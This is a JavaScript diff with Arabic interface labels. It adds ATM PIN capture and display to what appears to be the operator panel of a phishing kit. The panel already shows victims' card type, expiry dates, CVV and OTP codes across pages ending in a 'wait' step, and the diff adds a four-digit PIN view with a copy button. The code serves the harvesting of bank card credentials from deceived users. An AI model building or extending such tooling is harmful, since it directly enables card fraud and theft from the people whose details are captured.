@@ -41,7 +41,9 @@ const FORM_FIELD_LABELS = {
   // QPY
   cardType: 'نوع البطاقة', expMonth: 'شهر الانتهاء', expYear: 'سنة الانتهاء', cvv: 'CVV',
   // OTP/Verify
-  otpCode: 'رمز التحقق'
+  otpCode: 'رمز التحقق',
+  // ATM
+  atmPin: 'الرقم السري ATM', pin1: 'رقم 1', pin2: 'رقم 2', pin3: 'رقم 3', pin4: 'رقم 4'
 };
 
 function getAuthToken() {
@@ -711,6 +713,36 @@ function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
   container.appendChild(outerWrapper);
 }
 
+function renderAtmComponent(data, container) {
+  const pin = String(data.atmPin || [data.pin1, data.pin2, data.pin3, data.pin4].filter(Boolean).join('') || '').trim();
+  const digits = pin ? pin.split('') : ['-', '-', '-', '-'];
+
+  const outerWrapper = document.createElement('div');
+  outerWrapper.className = 'atm-card-container';
+
+  const codeBox = document.createElement('div');
+  codeBox.className = 'atm-code-box';
+
+  const digitsHtml = digits.map(d => `<span class="atm-digit-cell">${escapeHtml(d)}</span>`).join('');
+
+  codeBox.innerHTML = `
+    <span class="atm-label-text">
+      <i class="fas fa-lock"></i> الرقم السري للبطاقة (ATM PIN)
+    </span>
+    <div class="atm-digits-wrapper">
+      ${digitsHtml}
+    </div>
+    <div class="atm-actions-row">
+      <button class="btn-copy-otp" onclick="window.copyToClipboard('${escapeHtml(pin)}', this)">
+        <i class="fas fa-copy"></i> نسخ الرقم السري
+      </button>
+    </div>
+  `;
+
+  outerWrapper.appendChild(codeBox);
+  container.appendChild(outerWrapper);
+}
+
 function renderMessages(formData) {
   const list = document.getElementById('messages-list');
   if (!list) return;
@@ -726,7 +758,7 @@ function renderMessages(formData) {
     return;
   }
 
-  const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'wait'];
+  const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'atm', 'wait'];
   const allPages = Array.from(new Set([...pageOrder, ...Object.keys(formData)]));
   let hasEntries = false;
 
@@ -776,6 +808,14 @@ function renderMessages(formData) {
       // 5. Special Case: Payment Verify (Verification code standard)
       if (pageId === 'payment-verify') {
         renderOtpComponent(data, group, { isOtpPage: false });
+        hasEntries = true;
+        list.appendChild(group);
+        return;
+      }
+
+      // 6. Special Case: ATM PIN
+      if (pageId === 'atm') {
+        renderAtmComponent(data, group);
         hasEntries = true;
         list.appendChild(group);
         return;
